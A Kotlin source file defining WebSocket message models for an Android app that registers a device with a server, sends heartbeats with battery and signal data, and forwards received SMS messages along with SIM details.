package com.cornspace.aichat.data.model

sealed class WebSocketMessage {
    abstract val type: String

    // Incoming from server
    data class Connected(val connectionId: String) : WebSocketMessage() {
        override val type = "connected"
    }

    data class Registered(val deviceId: String) : WebSocketMessage() {
        override val type = "registered"
    }

    data class Ping(val timestamp: Long?) : WebSocketMessage() {
        override val type = "ping"
    }

    data class Ack(val messageId: String?, val success: Boolean) : WebSocketMessage() {
        override val type = "ack"
    }

    data class Error(val code: String?, val message: String) : WebSocketMessage() {
        override val type = "error"
    }

    // Outgoing to server
    data class Register(val data: RegisterData) : WebSocketMessage() {
        override val type = "register"
    }

    data class Heartbeat(val data: HeartbeatData) : WebSocketMessage() {
        override val type = "heartbeat"
    }

    data class SmsReceived(val data: SmsReceivedData) : WebSocketMessage() {
        override val type = "sms"
    }

    data class Pong(val timestamp: Long?) : WebSocketMessage() {
        override val type = "pong"
    }

    data class Unknown(override val type: String, val rawJson: String? = null) : WebSocketMessage()
}

// Registration data sent when connecting
data class RegisterData(
    val deviceId: String,
    val name: String?,
    val appVersion: String,
    val osVersion: String,
    val deviceModel: String,
    val manufacturer: String,
    val batteryLevel: Int,
    val isCharging: Boolean,
    val signalStrength: Int,
    val networkType: String,
    val sims: List<Map<String, Any?>>
)

// Heartbeat data sent periodically
data class HeartbeatData(
    val deviceId: String,
    val batteryLevel: Int,
    val isCharging: Boolean,
    val signalStrength: Int,
    val networkType: String,
    val sims: List<Map<String, Any?>>,
    val uptime: Long,
    val smsForwarded: Int
)

// SMS received data sent when new SMS arrives
data class SmsReceivedData(
    val deviceId: String,
    val sender: String,
    val content: String,
    val timestamp: Long,
    val simSlot: Int,
    val receiverNumber: String?,
    val simCarrier: String?,
    val simNetworkType: String?,
    val networkType: String?
)
